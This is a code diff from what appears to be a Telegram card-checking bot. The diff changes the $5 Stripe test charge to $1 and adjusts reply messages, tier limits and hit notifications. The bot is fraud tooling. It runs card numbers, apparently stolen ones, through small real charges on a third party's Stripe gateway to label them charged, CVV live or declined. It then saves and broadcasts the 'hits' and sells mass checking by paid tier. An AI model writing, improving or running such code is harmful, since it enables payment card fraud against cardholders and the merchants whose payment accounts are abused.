@@ -59419,11 +59419,11 @@ async def check_card_stripe_1usd(card: str, proxy: str = None, user_id: int = No
                     return {
                         "status": "success",
                         "result": "CHARGED",
-                        "message": "Order placed - Card charged $5",
+                        "message": "payment successful",
                         "status_display": "🔥 CHARGED ",
                         "status_category": "charged",
                         "elapsed": elapsed,
-                        "price": "$5.00",
+                        "price": "$1.00",
                         "gateway": "Stripe $1",
                         "payment_id": result.get('id')
                     }
@@ -59435,7 +59435,7 @@ async def check_card_stripe_1usd(card: str, proxy: str = None, user_id: int = No
                         "status_display": "🔐 3DS REQUIRED",
                         "status_category": "declined",
                         "elapsed": elapsed,
-                        "price": "$5.00",
+                        "price": "$1.00",
                         "gateway": "Stripe $1"
                     }
                 elif "error" in result:
@@ -59448,11 +59448,11 @@ async def check_card_stripe_1usd(card: str, proxy: str = None, user_id: int = No
                         return {
                             "status": "success",
                             "result": "INSUFFICIENT_FUNDS",
-                            "message": f"Insufficient funds: {error_msg}",
+                            "message": f" {error_msg}",
                             "status_display": "💰 INSUFFICIENT FUNDS",
                             "status_category": "approved",
                             "elapsed": elapsed,
-                            "price": "$5.00",
+                            "price": "$1.00",
                             "gateway": "Stripe $1"
                         }
                     elif "cvv" in error_msg.lower() or "security" in error_msg.lower():
@@ -59463,7 +59463,7 @@ async def check_card_stripe_1usd(card: str, proxy: str = None, user_id: int = No
                             "status_display": "✅ CVV LIVE",
                             "status_category": "approved",
                             "elapsed": elapsed,
-                            "price": "$5.00",
+                            "price": "$1.00",
                             "gateway": "Stripe $1"
                         }
                     else:
@@ -59474,7 +59474,7 @@ async def check_card_stripe_1usd(card: str, proxy: str = None, user_id: int = No
                             "status_display": f"❌ DECLINED ({decline_code})",
                             "status_category": "declined",
                             "elapsed": elapsed,
-                            "price": "$5.00",
+                            "price": "$1.00",
                             "gateway": "Stripe $1"
                         }
                 else:
@@ -59485,7 +59485,7 @@ async def check_card_stripe_1usd(card: str, proxy: str = None, user_id: int = No
                         "status_display": "❌ DECLINED",
                         "status_category": "declined",
                         "elapsed": elapsed,
-                        "price": "$5.00",
+                        "price": "$1.00",
                         "gateway": "Stripe $1"
                     }
                     
@@ -59499,7 +59499,7 @@ async def check_card_stripe_1usd(card: str, proxy: str = None, user_id: int = No
                         "status_display": "🔥 CHARGED ",
                         "status_category": "charged",
                         "elapsed": elapsed,
-                        "price": "$5.00",
+                        "price": "$1.00",
                         "gateway": "Stripe $1"
                     }
                 elif "card_declined" in confirm_response.text:
@@ -59512,7 +59512,7 @@ async def check_card_stripe_1usd(card: str, proxy: str = None, user_id: int = No
                         "status_display": f"❌ DECLINED ({decline_code})",
                         "status_category": "declined",
                         "elapsed": elapsed,
-                        "price": "$5.00",
+                        "price": "$1.00",
                         "gateway": "Stripe $1"
                     }
                 else:
@@ -59523,7 +59523,7 @@ async def check_card_stripe_1usd(card: str, proxy: str = None, user_id: int = No
                         "status_display": "❌ DECLINED",
                         "status_category": "declined",
                         "elapsed": elapsed,
-                        "price": "$5.00",
+                        "price": "$1.00",
                         "gateway": "Stripe $1"
                     }
             
@@ -59536,7 +59536,7 @@ async def check_card_stripe_1usd(card: str, proxy: str = None, user_id: int = No
             "status_display": "⚠️ TIMEOUT",
             "status_category": "error",
             "elapsed": time.time() - start_time,
-            "price": "$5.00",
+            "price": "$1.00",
             "gateway": "Stripe $1"
         }
     except Exception as e:
@@ -59549,7 +59549,7 @@ async def check_card_stripe_1usd(card: str, proxy: str = None, user_id: int = No
             "status_display": "⚠️ ERROR",
             "status_category": "error",
             "elapsed": time.time() - start_time,
-            "price": "$5.00",
+            "price": "$1.00",
             "gateway": "Stripe $1"
         }
 
@@ -59631,7 +59631,7 @@ def format_stripe_1usd_response(result: Dict, card: str, bin_info: tuple) -> Tup
 
 @check_gateway("stripe_1usd")
 async def single_check_stripe_1usd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Single card check with Stripe $1 gateway - /st"""
+    """Single card check with Stripe $1 gateway - /st <card>"""
     if not await verify_group_access(update, context):
         return
     
@@ -59640,8 +59640,8 @@ async def single_check_stripe_1usd(update: Update, context: ContextTypes.DEFAULT
             "💳 <b>Stripe $1 Gateway</b>\n\n"
             "Usage: <code>/st &lt;card&gt;</code>\n"
             "Example: <code>/st 4111111111111111|12|2028|123</code>\n\n"
-            "💰 Amount: $5.00\n"
-            "📍 Gateway: Beloved Community Stripe\n"
+            "💰 Amount: $1.00\n"
+            "📍 Gateway: Stripe\n"
             "✅ Checks: Charged, CVV Live, Insufficient Funds, 3D Secure",
             parse_mode=ParseMode.HTML
         )
@@ -59669,11 +59669,11 @@ async def single_check_stripe_1usd(update: Update, context: ContextTypes.DEFAULT
     # Check gateway access
     if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
         tier = user_manager.get_tier(user_id)
-        await message.reply_text(
+        error_message = (
             f"❌ <b>Stripe $1 not available for {tier.upper()} tier</b>\n\n"
-            f"Upgrade to Premium/Ultimate to use this gateway.",
-            parse_mode=ParseMode.HTML
+            f"Upgrade to Premium/Ultimate to use this gateway."
         )
+        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
         add_user_credits(user_id, 1)
         return
     
@@ -59685,7 +59685,11 @@ async def single_check_stripe_1usd(update: Update, context: ContextTypes.DEFAULT
             user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
         speed_controller = user_speed_controllers[user_id]
         
-        status_msg = await message.reply_text("🔄 Checking card with Stripe $1...")
+        # ============ ADD PREMIUM EMOJI TO CHECKING MESSAGE ============
+        status_msg = await message.reply_text(
+            f"{premium_emoji(PREMIUM_EMOJI_IDS['time'], '🔄')} Checking card with Stripe $1...",
+            parse_mode=ParseMode.HTML
+        )
         
         await speed_controller.wait_if_needed()
         start = time.time()
@@ -59718,7 +59722,7 @@ async def single_check_stripe_1usd(update: Update, context: ContextTypes.DEFAULT
             await save_hit_to_file(
                 card=card, gateway="Stripe $1",
                 response=result.get("message", "Approved"),
-                price="$5.00",
+                price="$1.00",
                 bin_info=bin_info, user_id=user_id, user_tier=tier
             )
             
@@ -59727,7 +59731,7 @@ async def single_check_stripe_1usd(update: Update, context: ContextTypes.DEFAULT
                 await send_hit_notification(
                     context=context, gateway="Stripe $1", card=card,
                     response=result.get("message", "Charged"),
-                    price="$5.00",
+                    price="$1.00",
                     user=user_data, bin_info=bin_info, status_category="charged"
                 )
                 user_manager.increment_hits(user_id)
@@ -59893,7 +59897,7 @@ async def mass_check_stripe_1usd_logic(update: Update, context: ContextTypes.DEF
         tier = user_manager.get_tier(u_id)
         
         CONCURRENCY = {
-            "free": 2,
+            "free": 1,
             "premium": 5,
             "ultimate": 1,
             "admin": 1,
@@ -60050,7 +60054,7 @@ async def mass_check_stripe_1usd_logic(update: Update, context: ContextTypes.DEF
                 f"{skull_emoji} <b>Stripe $1 Mass Check Complete</b>\n\n"
                 f"{charged_emoji} <b>Charged</b> ➛ {stats['charged']}\n"
                 f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
-                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']} (Hidden)\n"
+                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']} \n"
                 f"{errors_emoji} <b>Errors</b> ➛ 0\n"
                 f"📝 <b>Total</b> ➛ {total}\n"
                 f"⏱️ <b>Time</b> ➛ {minutes}m {seconds}s\n"
